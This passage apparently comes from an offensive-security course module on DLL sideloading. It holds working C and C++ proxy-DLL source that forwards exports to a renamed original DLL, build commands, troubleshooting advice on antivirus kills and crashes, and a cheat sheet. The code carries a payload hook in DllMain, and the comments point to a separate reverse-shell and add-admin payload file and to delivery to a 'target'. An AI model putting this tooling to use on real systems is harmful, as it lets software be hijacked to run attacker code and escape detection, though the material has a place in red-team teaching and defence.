+If the host looks fine until a specific button is clicked, a rarely used export was missed — blindly forward the entire `objdump` table into `.def`; don't hand-pick functions. If the original DLL exports data (variables), forwarding does not work for data exports — pick another sideload point. If "instant exit" is actually AV killing the process (faulting module `MsMpEng.exe` / a behavior engine), don't waste time on Proxy forwarding. If the payload still crashes after moving to a thread, first prove the path with a harmless action (write a file / MessageBox), then swap the real payload, and wrap with SEH so the host does not die with it.
+
+Isolate variables before changing code: the no-payload control is the first diagnostic tool. Crash freely on the replica VM; on the target minimize crash count. Hand-written export implementations can leak toolchain info via mangled names — `.def` forwarding is cleanest for the final package.
+
+::: details `m04-proxy-dll-sideload.c` · click to expand
+
+````c
+/*
+ * m04-proxy-dll-sideload.c
+ *
+ * Purpose: "Pure forward / no-payload control" Proxy for DLL sideloading.
+ *       Compile to a DLL with the same name as the host's original DLL
+ *       (e.g. legit.dll). Forward every export via forward.def to the
+ *       renamed original in the same directory (original.dll) so the host
+ *       keeps working. This file carries no payload — use it for scenario 12
+ *       isolation: prove "forwarding is correct and the host does not crash"
+ *       before swapping in the live m04-proxy-dll-newadmin.c.
+ * Scenario: M04 · Scenario 11 (compatibility check) / Scenario 12 (first step
+ *       when troubleshooting instant exit)
+ * Dependencies: MinGW-w64 or MSVC; original DLL export list
+ *       (objdump -p / dumpbin /exports)
+ * Usage:
+ *   # First generate forward.def from the export list (lines like
+ *   # "Foo = original.Foo"; see doc §2)
+ *   x86_64-w64-mingw32-gcc -shared -O2 -o legit.dll m04-proxy-dll-sideload.c forward.def
+ *   strip legit.dll
+ *   # MSVC: cl /LD m04-proxy-dll-sideload.c /Fe:legit.dll /link /DEF:forward.def
+ * Placeholders: none (pure forward; no network/account actions). Debug macros
+ *       in the file are off by default.
+ * Test status: Not lab-tested (no target VM). Syntax and link style follow
+ *   normal MinGW usage; on first use verify in a replica VM with
+ *   "host + original.dll renamed beside it" that the host starts cleanly.
+ */
+
+#include <windows.h>
+
+/*
+ * In DLL_PROCESS_ATTACH do the minimum and return TRUE.
+ * Rule: DllMain runs under the loader lock — no LoadLibrary, no waits,
+ * no network I/O.
+ * To confirm "our DLL really loaded" (local triage only; leaves artifacts
+ * on a target): define DEBUG_LOADED to append a timestamp line to
+ * %TEMP%\m04-sideload-loaded.txt.
+ */
+#ifdef DEBUG_LOADED
+#include <stdio.h>
+static void NoteLoaded(void)
+{
+    char path[MAX_PATH];
+    FILE *f;
+    if (!GetTempPathA(MAX_PATH, path))
+        return;
+    lstrcatA(path, "m04-sideload-loaded.txt");
+    f = fopen(path, "a");
+    if (f) {
+        fprintf(f, "proxy loaded into pid %lu\n", GetCurrentProcessId());
+        fclose(f);
+    }
+}
+#endif
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
+{
+    (void)hModule;
+    (void)lpReserved;
+    switch (ul_reason_for_call) {
+    case DLL_PROCESS_ATTACH:
+#ifdef DEBUG_LOADED
+        NoteLoaded();
+#endif
+        break;
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+
+/*
+ * Optional rundll32 test entry: rundll32 legit.dll,Run verifies this DLL
+ * can be loaded and called without the host (helps scenario 12 decide
+ * "host environment vs DLL").
+ * Note: in a real delivery package the DLL filename must be the name the
+ * host loads — do not rely on this entry.
+ */
+__declspec(dllexport) void CALLBACK Run(HWND hwnd, HINSTANCE hinst,
+                                        LPSTR lpszCmdLine, int nCmdShow)
+{
+    (void)hwnd; (void)hinst; (void)lpszCmdLine; (void)nCmdShow;
+    /* Empty body: only proves load/call chain works */
+}
+
+/*
+ * Note: all forwarded exports come from forward.def, not C declarations —
+ * avoids hand-writing every signature (wrong signature = wrong calling
+ * convention = scenario 12 crash).
+ * If .def forwarding is unsupported on your toolchain (some old binutils):
+ *   1) build with MSVC link.exe /DEF:forward.def;
+ *   2) or use the "hand-write a few forwards" mode in m04-proxy-dll-cpp.cpp
+ *      (when the function count is small).
+ */
+````
+
+:::
+
+::: details `m04-proxy-dll-cpp.cpp` · click to expand
+
+````cpp
+// m04-proxy-dll-cpp.cpp
+//
+// Purpose: C++ Proxy example for DLL sideloading. Focuses on three points:
+//   1) C++ exports must use extern "C" (otherwise names are mangled and the
+//      host cannot resolve the original names);
+//   2) Calling conventions: __stdcall vs __cdecl — decorated names (@N /
+//      leading underscore) differ;
+//   3) Role of the .def file, and trade-offs between static forwarding vs
+//      hand-written forwarding (runtime GetProcAddress).
+//      Static forwarding (.def: Foo = original.Foo) keeps original names and
+//      conventions automatically — preferred;
+//      The Forwarded wrappers here are only for "host calls a few functions
+//      and you do not want a full .def" — kept as a contrast style.
+// Scenario: M04 · Scenarios 11/12 (C++-shop isomorphic version; .def /
+//      convention triage reference)
+// Dependencies: MinGW-w64 g++ or MSVC; original DLL (renamed original.dll
+//      in the same directory)
+// Usage:
+//   x86_64-w64-mingw32-g++ -shared -O2 -std=c++17 -o legit.dll \
+//       m04-proxy-dll-cpp.cpp forward.def -lws2_32 -lnetapi32
+//   MSVC: cl /LD m04-proxy-dll-cpp.cpp /Fe:legit.dll /link /DEF:forward.def
+// Placeholders: no default payload; LHOST/LPORT notes are given — copy from
+//      m04-proxy-dll-newadmin.c when needed.
+// Test status: Not lab-tested (no target VM); syntax/link shape example only —
+//      verify on a replica VM before use.
+
+#define WIN32_LEAN_AND_MEAN
+#include <windows.h>
+#include <string>
+
+#pragma comment(lib, "kernel32.lib")
+
+// ---------------------------------------------------------------------------
+// Name-mangling notes (clearest on x86 32-bit; x64 has no cdecl/stdcall split
+// but still has C++ mangling):
+//   C++ member/free functions export mangled names by default (?Foo@@YAHH@Z).
+//   Avoid: wrap in extern "C"; or route everything through .def (.def names
+//   become the export names as written).
+//   In hand-written forwards, names/conventions must match the host imports,
+//   e.g. on 32-bit:
+//     __cdecl  int Foo(int)        -> _Foo
+//     __stdcall int Foo(int)       -> _Foo@4
+//   Write whatever name the host imports. Prefer .def static forwarding to
+//   skip this entirely.
+// ---------------------------------------------------------------------------
+
+extern "C" {
+
+// .def static-forward mode: this file only needs DllMain; all exports come
+// from forward.def:
+//   EXPORTS
+//     Foo = original.Foo
+//     Bar = original.Bar @7        ; keep @N for ordinal-only exports
+// Those forwards make the loader load original.dll from the same directory
+// and continue forwarding — host behavior unchanged.
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
+{
+    (void)hModule; (void)lpReserved;
+    switch (ul_reason_for_call) {
+    case DLL_PROCESS_ATTACH:
+        // Payload trigger: CreateThread only — no heavy work here
+        // (loader-lock limits same as the .c version).
+        break;
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+
+// ---------------------------------------------------------------------------
+// Contrast style: hand-written forwarding (runtime). Use only when the
+// original DLL exports few functions and you have every prototype. On first
+// call, resolve from same-directory original.dll and cache.
+// If the original exports dozens of functions, do not hand-write — use .def
+// full forwarding.
+// ---------------------------------------------------------------------------
+
+namespace {
+
+HMODULE g_original = nullptr;      // cached original.dll handle (lazy on first call)
+
+HMODULE LoadOriginal()
+{
+    if (g_original == nullptr)
+        g_original = LoadLibraryW(L"original.dll");
+    return g_original;
+}
+
+} // namespace
+
+// Example: host imports original.dll's __cdecl int Foo(int).
+// Export name is controlled by .def (recommended: Foo = original.Foo). Without
+// .def, if you use __declspec(dllexport), the export name of this signature
+// must match the host import name.
+__declspec(dllexport) int __cdecl Foo(int a)
+{
+    HMODULE h = LoadOriginal();
+    if (h == nullptr)
+        return -1;                 // fail soft if original.dll is missing — avoid host crash
+    typedef int(__cdecl *FooFn)(int);
+    FooFn fn = reinterpret_cast<FooFn>(GetProcAddress(h, "Foo"));
+    return fn ? fn(a) : -1;
+}
+
+// Example: __stdcall with 2 args → export name _Bar@8 on 32-bit.
+__declspec(dllexport) int __stdcall Bar(int a, int b)
+{
+    HMODULE h = LoadOriginal();
+    if (h == nullptr)
+        return -1;
+    typedef int(__stdcall *BarFn)(int, int);
+    BarFn fn = reinterpret_cast<BarFn>(GetProcAddress(h, "Bar"));
+    return fn ? fn(a, b) : -1;
+}
+
+} // extern "C"
+
+// ---------------------------------------------------------------------------
+// Project advice:
+//   * Prefer .def when available (original names/conventions/ordinals kept;
+//     no need to worry about extern "C");
+//   * One function per .def line; generate from the original DLL with
+//     objdump -p / dumpbin /exports;
+//   * Payload code (reverse / add-admin) is shared with the .c version —
+//     port from m04-proxy-dll-newadmin.c into DllMain or a dedicated thread
+//     function when needed.
+// ---------------------------------------------------------------------------
+````
+
+:::
+
+
+## Cheat sheet
+
+| You want to… | Use |
+|---|---|
+| Confirm sideload point | ProcMon: `Load Image` beside the host EXE (not System32) |
+| Build `forward.def` | `objdump -p` / `dumpbin /exports`; keep `@N` for ordinal-only |
+| Live Proxy (reverse / add-admin) | `m04-proxy-dll-newadmin.c` + `forward.def` |
+| Prove forwarding without a payload | `m04-proxy-dll-sideload.c` |
+| C++ / calling-convention notes | `m04-proxy-dll-cpp.cpp` |
+| Pack + arch / export checks | `m04-build-sideload-package.py` |
+| Instant exit | Stock pair → no-payload Proxy → live build; Event Viewer faulting module |
